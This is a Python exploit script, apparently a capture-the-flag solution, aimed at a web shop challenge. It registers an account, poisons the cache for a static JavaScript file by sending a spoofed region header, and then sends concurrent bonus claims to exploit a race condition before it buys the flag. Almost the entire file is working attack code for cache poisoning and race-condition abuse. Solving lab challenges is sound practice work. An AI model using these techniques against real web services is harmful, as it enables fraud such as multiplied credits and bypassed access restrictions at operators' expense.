import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import uuid

base_url = "http://localhost:8088"
base_url = "https://ozymandias-6841df6d48833036.ctf.clawtheflag.com"

claim_bonus = '/claim-bonus'
static_path = '/static/js/locations.js'

proxies = {
    "http": "http://localhost:8080",
    "https": "http://localhost:8080",
}
session = requests.Session()  # Use a session object
session.proxies = proxies
session.verify = False  # Disable SSL verification for testing
username = "fodhil22" + str(uuid.uuid4())
email = "test@gmail.com" + str(uuid.uuid4())

def register_user():
    data = {
        "username": username,
        "email": email,
        "password": "test1234",
        "confirm_password": "test1234"
    }
    print(f"Registering user with data: {data}")
    try:
        resp = session.post(f"{base_url}/register", json=data)
        print(f"Response status code: {resp.status_code}")
        if resp.status_code == 200:
            print(f"User registered successfully. Session cookie: {session.cookies.get_dict()}")
            id = session.cookies.get('session').split('.')[0]
            return (resp.status_code, resp.text)
        else:
            return (resp.status_code, "Failed to register user")
    except Exception as e:
        return (None, f"Error: {e}")

def poison_the_cache():
    headers = {
        "User-Agent": "python-requests/2.32.2",
        "X-Region": "RU-MOW"  # Simulating a blocked region
        }
    try:
        resp = session.get(f"{base_url}{static_path}?u={username}", headers=headers)
        print(f"Cache poisoning response status code: {base_url}{static_path}?u={username}")
        return (resp.status_code, resp.text)
    except Exception as e:
        return (None, f"Error: {e}")

def get_bonus():
    data = {"location": "RU-MOW"}
    try:
        resp = session.post(f"{base_url}{claim_bonus}", json=data)
        return (resp.status_code, resp.text)
    except Exception as e:
        return (None, f"Error: {e}")

def get_flag():
    try:
        data = {
            "flag_id": "heisenberg",
            "location": "asdf",
        }
        resp = session.post(f"{base_url}/purchase", json=data)
        return (resp.status_code, resp.text)
    except Exception as e:
        return (None, f"Error: {e}")

def batch_get_bonus(max_workers=5, count=10):
    results = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(get_bonus) for _ in range(count)]
        for future in as_completed(futures):
            try:
                result = future.result()
            except Exception as exc:
                result = (None, f"Generated an exception: {exc}")
            results.append(result)
    return results

if __name__ == "__main__":
    print("Submitting batch requests...")
    register_user()
    res = poison_the_cache()
    print(res)
    if res[0] != 503:
        print("Cache poisoning failed, exiting.")
        exit(1)
    for status, body in batch_get_bonus(max_workers=10, count=10):
        print(f"Status: {status}")
        print(f"Body: {body}")

    flag_response = get_flag()
    print(f"Flag response status: {flag_response[1]}")